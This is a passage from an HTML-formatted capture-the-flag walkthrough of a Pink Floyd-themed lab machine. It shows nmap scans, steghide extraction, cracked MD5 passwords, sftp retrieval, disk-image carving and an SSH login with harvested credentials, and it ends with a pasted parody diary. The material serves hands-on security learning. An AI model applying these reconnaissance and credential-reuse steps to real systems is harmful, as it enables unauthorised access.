+ End Time:           2017-08-02 10:44:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;37 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Nothing here apart from some XSS vulnerability. Let's keep looking, maybe in the image? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# exiftool index.jpeg
ExifTool Version Number         : 10.58
File Name                       : index.jpeg
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 112 kB
File Modification Date/Time     : 2017:08:02 10:42:39-04:00
File Access Date/Time           : 2017:08:02 10:42:39-04:00
File Inode Change Date/Time     : 2017:08:02 10:42:39-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Image Width                     : 750
Image Height                    : 717
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Image Size                      : 750x717
Megapixels                      : 0.538&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately there's nothing here. After some thinking I came to to the program called &lt;b&gt;steghide&lt;/b&gt;, which allows you to hide information. Let's try this method. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# steghide &lt;span class=&quot;nt&quot;&gt;--extract&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; index.jpeg
Enter passphrase:
steghide: could not extract any data with that passphrase!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We need a password! I started analyzing all of the information and the previously decoded hex string looks like credentials. And good for us, it's &lt;b&gt;md5&lt;/b&gt; hashed. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;33115730dbbb370fcbe9720fe632ec05	md5	divisionbell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, we can use &lt;b&gt;steghide&lt;/b&gt; once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# steghide &lt;span class=&quot;nt&quot;&gt;--extract&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; index.jpeg
Enter passphrase: divisionbell
wrote extracted data to &lt;span class=&quot;s2&quot;&gt;&quot;pink_floyd_syd.txt&quot;&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's view the data. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/Downloads# cat pink_floyd_syd.txt
Hey Syd,

I hear you're full of dust and guitars?

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another pass pair? This &lt;b&gt;base64&lt;/b&gt; strings decodes to username called &lt;b&gt;SydBarrett&lt;/b&gt;, and password hash is once again &lt;b&gt;md5&lt;/b&gt; - cracked into &lt;b&gt;pinkfloydrocks&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;U3lkQmFycmV0dA==    SydBarrett
f831605ae34c2399d1e5bb3a4ab245d0	md5	pinkfloydrocks
SydBarrett|pinkfloydrocks&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But what now? I decided to look for clues on &lt;b&gt;wikipedia&lt;/b&gt;, mentioning &quot;See Emily Play&quot;, but there was nothing that could help me right now. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;See Emily Play&quot; is a song by English rock band Pink Floyd, released as their second single in June 1967. Written by original frontman Syd Barrett and recorded on 23 May 1967, it featured &quot;The Scarecrow&quot; as its B-side.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Luckily, doing another &lt;b&gt;nmap&lt;/b&gt; full port scan, I've discovered another open one - &lt;b&gt; port 1965&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-03 07:42 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1965/tcp open  unknown
MAC Address: 08:00:27:B1:35:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;732.95 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can scan what services are running on it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1965 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-03 07:56 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00075s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
PORT     STATE SERVICE VERSION
1965/tcp open  ssh     OpenSSH 7.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 08:00:27:B1:35:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.26 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmmm, &lt;b&gt;ssh&lt;/b&gt; server. We can try connecting to it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# ssh SydBarrett@192.168.56.103 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1965
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'[192.168.56.103]:1965 ([192.168.56.103]:1965)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:KpS9gjJLvMxkvJcWxmzby+XlbwCEA3aiRFNisoGiWlM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103]:1965&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
SydBarrett@192.168.56.103'&lt;/span&gt;s password:
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.56.103 closed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Only &lt;b&gt;sftp&lt;/b&gt;? Let's connect once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# sftp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 1965 SydBarrett@192.168.56.103
SydBarrett@192.168.56.103&lt;span class=&quot;s1&quot;&gt;'s password:
Connected to 192.168.56.103.
sftp&amp;gt; ls -la
drwxr-x---    3 0        1000          512 Aug  2  2017 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .mail
-rw-r--r--    1 0        1000         1912 Oct 25  2015 bio.txt
-rw-r--r--    1 0        1000       868967 Oct 24  2015 syd_barrett_profile_pic.jpg             
sftp&amp;gt; get bio.txt
Fetching /bio.txt to bio.txt
/bio.txt                                      100% 1912   434.8KB/s   00:00    
sftp&amp;gt; get syd_barrett_profile_pic.jpg
Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg                  100%  849KB   7.6MB/s   00:00
sftp&amp;gt; cd .mail
sftp&amp;gt; ls -la
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    2 0        1000          512 Nov 11  2015 .stash
-rw-r--r--    1 0        1000          309 Oct 24  2015 sent-items
sftp&amp;gt; get sent-items
Fetching /.mail/sent-items to sent-items
/.mail/sent-items                                                                                                   100%  309   140.9KB/s   00:00    
sftp&amp;gt; cd .stash
sftp&amp;gt; ls -la
drwxr-xr-x    2 0        1000          512 Nov 11  2015 .
drwxr-xr-x    3 0        1000          512 Oct 24  2015 ..
-rw-r--r--    1 0        1000     48884479 Aug  7  2015 eclipsed_by_the_moon
sftp&amp;gt; get eclipsed_by_the_moon
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon   
sftp&amp;gt; exit&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here's a lot of goodies. We got one text file, one image and one mail from that server. Now it's time  to investigate them. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;bio.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/Downloads# cat bio.txt
&quot;Roger Keith &quot;Syd&quot; Barrett (6 January 1946 – 7 July 2006) was an English musician, composer, singer, songwriter, and painter. Best known as a founder member of the band Pink Floyd, Barrett was the lead singer, guitarist and principal songwriter in its early years and is credited with naming the band. Barrett was excluded from Pink Floyd in April 1968 after David Gilmour took over as their new frontman, and was briefly hospitalized amid speculation of mental illness.

Barrett was musically active for less than ten years. With Pink Floyd, he recorded four singles, their debut album (and contributed to the second one), and several unreleased songs. Barrett began his solo career in 1969 with the single &quot;Octopus&quot; from his first solo album, The Madcap Laughs (1970). The album was recorded over the course of a year with five different producers (Peter Jenner, Malcolm Jones, David Gilmour, Roger Waters and Barrett himself). Nearly two months after Madcap was released, Barrett began working on his second and final album, Barrett (1970), produced by Gilmour and featuring contributions from Richard Wright. He went into self-imposed seclusion until his death in 2006. In 1988, an album of unreleased tracks and outtakes, Opel, was released by EMI with Barrett's approval.

Barrett's innovative guitar work and exploration of experimental techniques such as dissonance, distortion and feedback influenced many musicians, including David Bowie and Brian Eno. His recordings are also noted for their strongly English-accented vocal delivery. After leaving music, Barrett continued with painting and dedicated himself to gardening. Biographies began appearing in the 1980s. Pink Floyd wrote and recorded several tributes to him, most notably the 1975 album Wish You Were Here, which included &quot;Shine On You Crazy Diamond&quot;, as homage to Barrett.&quot;

Source: Wikipedia (https://en.wikipedia.org/wiki/Syd_Barrett)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;syd_barrett_profile_pic.jpg&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# exiftool syd_barrett_profile_pic.jpg
ExifTool Version Number         : 10.58
File Name                       : syd_barrett_profile_pic.jpg
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 849 kB
File Modification Date/Time     : 2017:08:03 08:00:14-04:00
File Access Date/Time           : 2017:08:03 08:00:14-04:00
File Inode Change Date/Time     : 2017:08:03 08:00:14-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Intel, II&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Quality                         : 82%
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:E5450E5ADA2711E1A898C9AB7D94C9BA
Document ID                     : xmp.did:E5450E5BDA2711E1A898C9AB7D94C9BA
Derived From Instance ID        : xmp.iid:E5450E58DA2711E1A898C9AB7D94C9BA
Derived From Document ID        : xmp.did:E5450E59DA2711E1A898C9AB7D94C9BA
DCT Encode Version              : 100
APP14 Flags 0                   : &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14], Encoded with &lt;span class=&quot;nv&quot;&gt;Blend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 downsampling
APP14 Flags 1                   : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Color Transform                 : YCbCr
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Image Size                      : 1920x1080
Megapixels                      : 2.1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# steghide &lt;span class=&quot;nt&quot;&gt;--extract&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; syd_barrett_profile_pic.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But &lt;b&gt;eclipsed_by_the_moon&lt;/b&gt; is much better find. Let's unzip it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file eclipsed_by_the_moon
eclipsed_by_the_moon: gzip compressed data, last modified: Wed Nov 11 00:15:47 2015, from Unix
root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf eclipsed_by_the_moon
eclipsed_by_the_moon.lsd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;What is this extension - &lt;b&gt;lsd&lt;/b&gt;?  Google suggests this. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;An LSD file may be a system dictionary supplied with Lingvo Dictionary or created by users.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But &lt;b&gt;file&lt;/b&gt; command produces something else. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file eclipsed_by_the_moon.lsd
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID &lt;span class=&quot;s2&quot;&gt;&quot;MSDOS5.0&quot;&lt;/span&gt;, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;volumes &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 32 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; , serial number 0x9e322180, unlabeled, FAT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16 bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now I'm going to use &lt;b&gt;foremost&lt;/b&gt;, great forensics tool, in order to scan the file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# foremost eclipsed_by_the_moon.lsd
Processing: eclipsed_by_the_moon.lsd
|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;|
root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;output
root@kali:~/Downloads/output# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxr-xr-- 3 root root 4096 Aug  3 08:15 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root root 4096 Aug  3 08:15 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  694 Aug  3 08:15 audit.txt
drwxr-xr-- 2 root root 4096 Aug  3 08:15 jpg
root@kali:~/Downloads/output# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;audit.txt
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Thu Aug  3 08:15:25 2017
Invocation: foremost eclipsed_by_the_moon.lsd
Output directory: /root/Downloads/output
Configuration file: /etc/foremost.conf
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------&lt;/span&gt;
File: eclipsed_by_the_moon.lsd
Start: Thu Aug  3 08:15:25 2017
Length: 47 MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49283072 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Num	 Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;512&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	       Size	 File Offset	 Comment

0:	00000418.jpg 	     123 KB 	     214016 	 
Finish: Thu Aug  3 08:15:26 2017

1 FILES EXTRACTED

jpg:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------&lt;/span&gt;

Foremost finished at Thu Aug  3 08:15:26 2017
root@kali:~/Downloads/output/jpg# file 00000418.jpg
00000418.jpg: JPEG image data, JFIF standard 1.01, resolution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, density 72x72, segment length 16, progressive, precision 8, 604x388, frames 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have a file, let's take a look at it! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/key-file.png&quot; alt=&quot;Key file&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here we have a password &lt;b&gt;hello_is_there_anybody_in_there&lt;/b&gt;. But for what account? After another bit of googling I've identified man on the picture as &lt;b&gt;George Roger Waters&lt;/b&gt;. Now we can use previous name scheme and guess the username for &lt;b&gt;ssh&lt;/b&gt; service, with just found password. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/Downloads/output/jpg# ssh RogerWaters@192.168.56.103 -p 1965
RogerWaters@192.168.56.103's password:
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!&quot;`
                   .x*&quot;`
               ..+&quot;NP
            .z&quot;&quot;   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  &quot;'     '    @'   '$o*&quot;'   
$ ls -la
total 176
drwx------  3 RogerWaters  RogerWaters    512 Oct 28  2015 .
drwxr-xr-x  7 root         wheel          512 Oct 24  2015 ..
-rw-r--r--  1 RogerWaters  RogerWaters     87 Oct 24  2015 .Xdefaults
-rw-r--r--  1 RogerWaters  RogerWaters    773 Oct 24  2015 .cshrc
-rw-r--r--  1 RogerWaters  RogerWaters    103 Oct 24  2015 .cvsrc
-rw-r--r--  1 RogerWaters  RogerWaters    398 Oct 26  2015 .login
-rw-r--r--  1 RogerWaters  RogerWaters    175 Oct 24  2015 .mailrc
-rw-r--r--  1 RogerWaters  RogerWaters    218 Oct 24  2015 .profile
drwx------  2 RogerWaters  RogerWaters    512 Oct 26  2015 .ssh
-rw-r--r--  1 RogerWaters  RogerWaters   2853 Oct 26  2015 bio.txt
-rw-r--r--  1 RogerWaters  RogerWaters      0 Oct 28  2015 mbox
-rw-r--r--  1 RogerWaters  RogerWaters  48177 Oct 26  2015 roger_waters_profile_pic.jpg
-rw-r--r--  1 RogerWaters  RogerWaters  16588 Oct 26  2015 secret-diary&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another series of goodies. Let's take a look at them, one by one. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;secret-diary&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cat secret-diary                                                                                                                                   
This was posted to alt.music.roger-waters and alt.music.pink-floyd back in mid-1996 by Stuart Greig. It is entirely ficticious and is provided here only as a form of parody.  Source: http://www.ingsoc.com/waters/humour/rwdiary.html

    Week One
    Monday

        Got up, had a bath. Thought that the water looked a dark colour - then realised I still had my aviator sunglasses on. Listened to the radio and felt a bit alienated. Wrote another concept album on video recorders as I realised I'd already done TV and radio. Had lunch and the postman turned up. A letter from mum reminding me that it's Uncle Bob's birthday next week. The power she still wields...will I never be free?? Beat my fists against the wall in anger and frustration for about 20 minutes. Decided to have a cup of tea. Milk had gone off. I detect the hand of David Gilmour in this.

    Tuesday

        Got up. Thought about the war and the market forces destroying the world for an hour or so. Felt a bit depressed so I decided to put on my black jeans, black T shirt, black casual jacket and aviators. Felt much better and decided to go out for some milk and card for Uncle Bob. Nearly got out the door before I realised I hadn't rolled up the sleeves of my casual jacket!! Narrow escape there.

    Wednesday

        Got up, suddenly realised that my father was dead and that no-one understood my alienation as a musical genius. Burnt down the new conservatory in an angst ridden rage. Man next door tried to engage me in conversation about someone called &quot;Gazza&quot; before I torched his too. He is a pleb and I am an artist. He was leaning on the fence watching me. I feel there might be a large scale concept piece in this about the gulf between the artsists and the philistine masses. Couldn't think of a physical symbol to hang the work around and snagged my casual jacket on a nail sticking out of the fence. Asked the pleb if he had seen a man answering David Gilmours description hammering the nail in but he'd obviously paid the pleb off.

    Thursday

        Got up, message from Dave on the ansaphone asking me to get back together with the band again. Rang Eric Clapton and asked him to send Dave's wife some flowers thanking her for the wonderful nights they spent together. That should fuck him up. Felt so good I came up with a great lateral thinking idea on the new album - The Fence!! I could stage it at the whitehouse, or even the moon!! Thought I should probably play myself, but who for Mum and Uncle Bob?? Sinead? Van? Madonna? Phoned Bob Geldof to see if he wanted to get involved. He told me to &quot;fook off&quot;. Felt bad, nearly wrote another album but decided to forgive Bob and went round to join him and we both beat our fists against the wall for a couple of hours.

    Friday

        Got up, then went back to bed as I couldn't face the day - can't anyone else see our lives are revolving around TV?? For god's sake, it should be my musical genius it revolves around!! Mum rang at night tosee if I was OK. She came round with some chicken soup - I didn't eat it as it might have those mind controlling drugs in it but at least she got my other black casual jackets back from the dry cleaners. When will this woman stop controlling my life!!

    Saturday

        Rang Sinead. Apparently she has to tidy her room for the forseeable future. Van rang, but it was difficult to tell wether he was interested or not as there was so much background noise - all bottles clinking and horseracing. Madonna didn't ring back. I detect the hand of David Gilmour in this.

    Sunday

        Project in tatters. Postman came and the first letter was my royalties from Pink Floyds latest tour. I'm sure it's £1 short. Letter from mum - Uncle Bob was killed by a bus yesterday. I feel a large scale concept album about the perils of public transport in a monopolistic state coming on. Finished it in time to watch MTV before bed. Saw David Gilmour dancing with Madonna!!! I detect the hand of my mother in this!!

    Week Two
    Monday

        Got up. Had a bath. Doctor came round - said they would have to operate to remove my sunglasses. Decided to give it a miss - after all, I've never seen Dave Gilmour in shades. Postman arrived with my 55 volume box video set of the first world war. Couldn't see my dad in it, but there was a guy who looked like him. The bleeding hearts came round in the afternoon - apparently Snowy has started taking lessons from Dave himself. We jammed for a bit until someone pointed out I couldn't sing. Threw them all out in a huff.

    Tuesday

        Meeting with the guys at Sony. Apparently they are objecting to my new 3 CD concept album roughly entitled &quot;Record companies screw the life out of creative geniuses worse than Maggie Thatcher did to the miners&quot;. Philistines. They calmed down a bit when they realised it wouldn't be out for another three years by which time the concept would have changed beyond all recognition anyway. Talked about poor album sales. This one had better be good they said, get some good guitarists. They suggested Dave Gilmour - I suggested they fuck off.

        Journalist phoend to ask when I would tour next. Told him as soon as Hades drops below 0 degrees and it's moisture crystalises in to a solid - or if more than a few hundred people buy tickets. He didn't understand the first part but I think he got the message.

    Wednesday

        Phoned Eric Clapton - but his mum said he can't come out to play with me anymore as I depress him. Talked to her about the war for a bit till she hung up. Mothers - they're all the same. Went in the studio and met some guy called Steve Vai - apparently he plays guitar. Asked him to put some stuff over my demos but he just warmed up for an hour, asked if it was OK and left. Dave and the guys were in the studio next door and sent through a demo they were working on to see if I would put some lyrics on it. I did, it went like this -

            Fuck off Dave Gilmour
            And the rest of you too
            Keep your sodding ferraris
            Your mums smell like poo

            You got the floyd name
            but I know your game
            It's all metaphysics
            And I write better lyrics

        Not my best work but I thougt it appropriate under the circumstances. Phoned my lawyer and asked him to phone Dave's lawyer and say that Dave was a wanker. And anyway, didn't I get a restraining order??

    Thursday

        New album going well - should be finished in about 40 odd remixes and several title changes. Did some more work on the opera. Finally found the kind of music for me - you don't need to sing!! You get a big fat woman to do it for you. At least it makes a change from Paul Carrack. Sinead came round for a while and we both moaned about how hard it was to be misunderstood artistic genuis's. She asked if she could do a bit for the new album - said we'd already got someone to make the sandwiches.
